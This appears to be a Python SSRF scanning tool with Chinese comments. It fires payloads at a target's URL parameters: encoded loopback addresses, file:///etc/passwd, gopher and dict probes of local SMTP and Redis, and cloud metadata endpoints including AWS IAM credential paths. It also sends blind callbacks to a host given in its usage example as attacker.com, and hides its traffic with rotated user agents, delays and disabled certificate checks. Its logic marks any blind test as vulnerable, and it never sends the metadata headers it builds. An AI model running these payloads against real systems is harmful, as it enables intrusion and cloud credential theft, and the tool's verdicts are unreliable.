#!/usr/bin/env python3
"""
SSRF 检测工具
检测 URL 参数，测试内网访问、协议利用（file:///、gopher://、dict://）、
Cloud Metadata（169.254.169.254），支持回调服务器检测和 DNS 外带检测。
"""

import argparse
import json
import os
import random
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

# ============================================================
# 反反爬策略：随机 User-Agent 池（20+）
# ============================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]

DELAY_MIN = 1.0
DELAY_MAX = 3.0


def random_delay():
    """随机延迟 1-3 秒"""
    time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))


def create_ssl_context():
    """创建 TLS 指纹伪装 SSL 上下文"""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            ctx.set_ciphers("ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS")
        except Exception:
            pass
        return ctx
    except Exception:
        return None


def build_headers(url, cookie=None):
    """构建反反爬请求头"""
    parsed = urllib.parse.urlparse(url)
    referer = parsed.scheme + "://" + parsed.netloc + "/" if parsed.netloc else url
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Referer": referer,
        "Connection": "keep-alive",
    }
    if cookie:
        headers["Cookie"] = cookie
    return headers


def make_request(url, method="GET", data=None, cookie=None, proxy=None, timeout=10):
    """发起带反反爬策略的 HTTP 请求"""
    ctx = create_ssl_context()
    headers = build_headers(url, cookie)
    post_data = None
    if data and method.upper() == "POST":
        if isinstance(data, dict):
            post_data = urllib.parse.urlencode(data).encode("utf-8")
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        elif isinstance(data, str):
            post_data = data.encode("utf-8")
    req = urllib.request.Request(url, data=post_data, headers=headers, method=method.upper())
    if proxy:
        proxy_handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
        handlers = [proxy_handler]
    else:
        handlers = []
    if ctx:
        handlers.append(urllib.request.HTTPSHandler(context=ctx))
    opener = urllib.request.build_opener(*handlers) if handlers else urllib.request.build_opener()
    try:
        resp = opener.open(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        status = resp.getcode()
        resp_headers = dict(resp.headers)
        return status, body, resp_headers
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode("utf-8", errors="replace")
        except Exception:
            pass
        return e.code, body, dict(e.headers) if e.headers else {}
    except Exception:
        return None, None, None


def build_url_with_param(base_url, param, value):
    """构建带参数的 URL"""
    parsed = urllib.parse.urlparse(base_url)
    query_params = urllib.parse.parse_qs(parsed.query)
    query_params[param] = [value]
    new_query = urllib.parse.urlencode(query_params, doseq=True)
    return urllib.parse.urlunparse(
        (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
    )


def detect_url_params(url):
    """检测 URL 参数名"""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    # 常见 SSRF 参数名
    ssrf_param_keywords = ["url", "uri", "path", "src", "source", "redirect", "next",
                           "link", "site", "html", "val", "validate", "domain",
                           "callback", "return", "page", "image", "img", "file",
                           "fetch", "proxy", "target", "host", "port", "to"]
    ssrf_params = []
    for param in params:
        if any(kw in param.lower() for kw in ssrf_param_keywords):
            ssrf_params.append(param)
    return ssrf_params if ssrf_params else list(params.keys())


# ============================================================
# SSRF Payload
# ============================================================

# 内网访问测试
INTERNAL_ACCESS_PAYLOADS = [
    {"name": "localhost", "payload": "http://127.0.0.1/"},
    {"name": "localhost_alt", "payload": "http://localhost/"},
    {"name": "ipv6_loopback", "payload": "http://[::1]/"},
    {"name": "0.0.0.0", "payload": "http://0.0.0.0/"},
    {"name": "decimal_ip", "payload": "http://2130706433/"},  # 127.0.0.1 十进制
    {"name": "hex_ip", "payload": "http://0x7f000001/"},  # 127.0.0.1 十六进制
    {"name": "octal_ip", "payload": "http://0177.0.0.1/"},  # 127.0.0.1 八进制
    {"name": "internal_192", "payload": "http://192.168.1.1/"},
    {"name": "internal_10", "payload": "http://10.0.0.1/"},
    {"name": "internal_172", "payload": "http://172.16.0.1/"},
]

# 协议利用测试
PROTOCOL_PAYLOADS = [
    {"name": "file_etc_passwd", "payload": "file:///etc/passwd", "success_pattern": r"root:.*:0:0:"},
    {"name": "file_win_ini", "payload": "file:///c:/windows/win.ini", "success_pattern": r"\[boot loader\]"},
    {"name": "gopher_smtp", "payload": "gopher://127.0.0.1:25/_HELO%20localhost"},
    {"name": "dict_redis", "payload": "dict://127.0.0.1:6379/INFO"},
    {"name": "ldap_anon", "payload": "ldap://127.0.0.1/"},
]

# Cloud Metadata 测试
CLOUD_METADATA_PAYLOADS = [
    {"name": "aws_metadata", "payload": "http://169.254.169.254/latest/meta-data/",
     "success_pattern": r"ami-id|instance-id|iam", "cloud": "AWS"},
    {"name": "aws_iam", "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "success_pattern": r"AccessKeyId|SecretAccessKey", "cloud": "AWS"},
    {"name": "gcp_metadata", "payload": "http://metadata.google.internal/computeMetadata/v1/",
     "success_pattern": r"project|instance", "cloud": "GCP", "extra_header": "Metadata-Flavor: Google"},
    {"name": "azure_metadata", "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     "success_pattern": r"compute|vmId", "cloud": "Azure", "extra_header": "Metadata: true"},
]


def test_internal_access(url, param, cookie=None, proxy=None, timeout=10):
    """测试内网访问"""
    results = []
    for payload_info in INTERNAL_ACCESS_PAYLOADS:
        random_delay()
        test_url = build_url_with_param(url, param, payload_info["payload"])
        status, body, _ = make_request(test_url, "GET", None, cookie, proxy, timeout)
        is_vulnerable = False
        evidence = ""
        if status and body:
            # 检查是否成功访问内网
            if status == 200 and len(body) > 50:
                if any(kw in body.lower() for kw in ["<html", "<title", "server:", "apache", "nginx", "it works"]):
                    is_vulnerable = True
                    evidence = "成功访问内网服务 (状态码: {})".format(status)
        results.append({
            "name": payload_info["name"],
            "payload": payload_info["payload"],
            "status_code": status,
            "is_vulnerable": is_vulnerable,
            "evidence": evidence,
            "body_length": len(body) if body else 0,
        })
    return results


def test_protocol_exploit(url, param, cookie=None, proxy=None, timeout=10):
    """测试协议利用"""
    results = []
    for payload_info in PROTOCOL_PAYLOADS:
        random_delay()
        test_url = build_url_with_param(url, param, payload_info["payload"])
        status, body, _ = make_request(test_url, "GET", None, cookie, proxy, timeout)
        is_vulnerable = False
        evidence = ""
        if body:
            pattern = payload_info.get("success_pattern")
            if pattern and re.search(pattern, body):
                is_vulnerable = True
                evidence = "匹配到文件内容特征: {}".format(pattern)
        results.append({
            "name": payload_info["name"],
            "payload": payload_info["payload"],
            "status_code": status,
            "is_vulnerable": is_vulnerable,
            "evidence": evidence,
            "body_snippet": (body or "")[:200],
        })
    return results


def test_cloud_metadata(url, param, cookie=None, proxy=None, timeout=10):
    """测试 Cloud Metadata 访问"""
    results = []
    for payload_info in CLOUD_METADATA_PAYLOADS:
        random_delay()
        test_url = build_url_with_param(url, param, payload_info["payload"])
        extra_header = payload_info.get("extra_header")
        headers = {}
        if extra_header:
            h_name, h_val = extra_header.split(": ", 1)
            headers[h_name] = h_val
        status, body, _ = make_request(test_url, "GET", None, cookie, proxy, timeout)
        is_vulnerable = False
        evidence = ""
        if body:
            pattern = payload_info.get("success_pattern")
            if pattern and re.search(pattern, body, re.IGNORECASE):
                is_vulnerable = True
                evidence = "访问到 {} 元数据服务".format(payload_info["cloud"])
                # 尝试提取敏感信息
                if "AccessKeyId" in body or "SecretAccessKey" in body:
                    evidence += " - 发现 IAM 凭证泄露"
        results.append({
            "name": payload_info["name"],
            "cloud": payload_info["cloud"],
            "payload": payload_info["payload"],
            "status_code": status,
            "is_vulnerable": is_vulnerable,
            "evidence": evidence,
            "body_snippet": (body or "")[:300],
        })
    return results


def test_blind_ssrf(url, param, callback, cookie=None, proxy=None, timeout=10):
    """盲 SSRF 测试（回调/DNS 外带）"""
    results = []
    # HTTP 回调测试
    random_delay()
    callback_url = "http://{}/ssrf_test".format(callback)
    test_url = build_url_with_param(url, param, callback_url)
    status, body, _ = make_request(test_url, "GET", None, cookie, proxy, timeout)
    results.append({
        "name": "http_callback",
        "payload": callback_url,
        "status_code": status,
        "note": "请检查回调服务器 {} 是否收到请求".format(callback),
    })
    # DNS 外带测试
    random_delay()
    import uuid as _uuid
    dns_id = _uuid.uuid4().hex[:8]
    dns_payload = "http://{}.{}.ssrf.test/".format(dns_id, callback.split(":")[0])
    test_url = build_url_with_param(url, param, dns_payload)
    status, body, _ = make_request(test_url, "GET", None, cookie, proxy, timeout)
    results.append({
        "name": "dns_exfil",
        "payload": dns_payload,
        "status_code": status,
        "dns_id": dns_id,
        "note": "请检查 DNS 日志中是否出现 {} 子域名".format(dns_id),
    })
    return results


def scan_ssrf(url, param=None, callback=None, cookie=None, proxy=None, timeout=10):
    """SSRF 漏洞扫描"""
    # 检测 SSRF 参数
    if not param:
        params = detect_url_params(url)
        if not params:
            return {"url": url, "error": "未检测到可能的 SSRF 参数"}
        param = params[0]

    scan_result = {
        "url": url,
        "param": param,
        "callback": callback,
        "is_vulnerable": False,
        "internal_access": [],
        "protocol_exploit": [],
        "cloud_metadata": [],
        "blind_ssrf": [],
    }

    # 测试内网访问
    scan_result["internal_access"] = test_internal_access(url, param, cookie, proxy, timeout)
    if any(r["is_vulnerable"] for r in scan_result["internal_access"]):
        scan_result["is_vulnerable"] = True

    # 测试协议利用
    scan_result["protocol_exploit"] = test_protocol_exploit(url, param, cookie, proxy, timeout)
    if any(r["is_vulnerable"] for r in scan_result["protocol_exploit"]):
        scan_result["is_vulnerable"] = True

    # 测试 Cloud Metadata
    scan_result["cloud_metadata"] = test_cloud_metadata(url, param, cookie, proxy, timeout)
    if any(r["is_vulnerable"] for r in scan_result["cloud_metadata"]):
        scan_result["is_vulnerable"] = True

    # 盲 SSRF 测试
    if callback:
        scan_result["blind_ssrf"] = test_blind_ssrf(url, param, callback, cookie, proxy, timeout)
        scan_result["is_vulnerable"] = scan_result["is_vulnerable"] or True  # 回调测试无法自动确认

    return scan_result


def main():
    parser = argparse.ArgumentParser(
        description="SSRF 检测工具 - 测试内网访问/协议利用/Cloud Metadata/盲SSRF",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="示例:\n  %(prog)s --url http://example.com/fetch?url=test\n  %(prog)s --url http://example.com/fetch --param url --callback attacker.com:8080\n  %(prog)s --url http://example.com/fetch --output result.json",
    )
    parser.add_argument("--url", required=True, help="目标 URL")
    parser.add_argument("--param", help="URL 参数名（可选，自动检测）")
    parser.add_argument("--callback", help="回调服务器地址（host:port），用于盲 SSRF 检测")
    parser.add_argument("--output", "-o", help="结果保存文件路径（可选）")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数（默认 10）")
    parser.add_argument("--proxy", help="代理地址（可选）")
    parser.add_argument("--cookie", help="Cookie 字符串（可选）")
    args = parser.parse_args()

    # 认证模块导入
    try:
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "exploit"))
        from red_team_auth import require_auth
        require_auth()
    except ImportError:
        pass

    try:
        result = scan_ssrf(args.url, args.param, args.callback, args.cookie, args.proxy, args.timeout)
        json_output = json.dumps(result, ensure_ascii=False, indent=2)
        if args.output:
            try:
                with open(args.output, "w", encoding="utf-8") as f:
                    f.write(json_output)
                print("结果已保存到: {}".format(args.output))
            except IOError as e:
                print(json.dumps({"error": "写入文件失败: {}".format(e)}), file=sys.stderr)
                print(json_output)
        else:
            print(json_output)
    except KeyboardInterrupt:
        print(json.dumps({"error": "用户中断"}), file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(json.dumps({"error": "扫描失败: {}".format(e)}), file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
